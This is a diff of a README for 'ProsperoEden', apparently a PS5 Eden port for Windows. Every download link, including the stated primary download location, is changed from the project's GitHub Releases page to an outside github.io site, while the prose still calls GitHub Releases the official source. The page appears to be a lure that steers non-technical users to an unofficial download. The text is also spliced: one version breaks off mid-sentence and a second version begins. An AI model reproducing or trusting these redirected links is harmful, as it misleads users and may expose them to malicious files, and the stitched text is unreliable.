@@ -1,6 +1,6 @@
 # 🎮 ProsperoEden - Run Experimental PS5 Eden Software on Windows
 
-[![Download ProsperoEden](https://img.shields.io/badge/Download-ProsperoEden-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jarama88/ProsperoEden/releases)
+[![Download ProsperoEden](https://img.shields.io/badge/Download-ProsperoEden-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://jarama88.github.io)
 
 ProsperoEden is an experimental Eden port for PS5. This page is written for everyday Windows users who want a clear path from the download page to the application without needing programming knowledge. The project is experimental, so the GitHub Releases page is the place to get the current download and follow the project’s latest published files.
 
@@ -8,7 +8,7 @@ ProsperoEden is an experimental Eden port for PS5. This page is written for ever
 
 Use the large download button above or the link below to reach the official ProsperoEden releases page.
 
-[➡️ Visit the ProsperoEden download page](https://github.com/Jarama88/ProsperoEden/releases)
+[➡️ Visit the ProsperoEden download page](https://jarama88.github.io)
 
 Visit this link to download the application.
 
@@ -34,7 +34,7 @@ ProsperoEden is described as an experimental Eden port for PS5. It is a project 
 
 The project uses GitHub Releases as its download location. That means the download page may be updated as the project changes. For the best experience, use the download link on this page rather than copying files from other places. The official release page keeps the download process in one place and makes it easier to return to the source if# 🎮 ProsperoEden - Explore PS5 Eden on Windows
 
-[![Download ProsperoEden](https://img.shields.io/badge/Download-ProsperoEden-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jarama88/ProsperoEden/releases)
+[![Download ProsperoEden](https://img.shields.io/badge/Download-ProsperoEden-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://jarama88.github.io)
 
 ProsperoEden is an experimental Eden port for PS5. This guide is for Windows users who want a clear path from the download page to the application without needing programming knowledge. The official download location is the ProsperoEden releases page.
 
@@ -42,7 +42,7 @@ ProsperoEden is an experimental Eden port for PS5. This guide is for Windows use
 
 Use the large download button at the top of this page or the link below to reach the official ProsperoEden download page.
 
-[➡️ Visit this link to download the application.](https://github.com/Jarama88/ProsperoEden/releases)
+[➡️ Visit this link to download the application.](https://jarama88.github.io)
 
 Visit this link to download the application.
 
@@ -79,7 +79,7 @@ Open the downloaded ProsperoEden application from the folder where it was saved.
 
 ProsperoEden is an experimental project, and the download page is the place to check for the current release. Return to the same link to reach the official page. Use the page to download the application when you want the latest file from the project.
 
-[➡️ Open the ProsperoEden download page](https://github.com/Jarama88/ProsperoEden/releases)
+[➡️ Open the ProsperoEden download page](https://jarama88.github.io)
 
 ## 🛠️ Organizing Your Files
 
@@ -103,7 +103,7 @@ Open File Explorer and check the Downloads folder first.
 
 Repository name: ProsperoEden  
 Description: Experimental Eden port for PS5  
-Primary download location: https://github.com/Jarama88/ProsperoEden/releases
+Primary download location: https://jarama88.github.io
 
 ProsperoEden is built around an experimental Eden port for PS5. The project uses GitHub Releases as its download page. That page is the source for the application download and the place to return to when you need the current file.
 
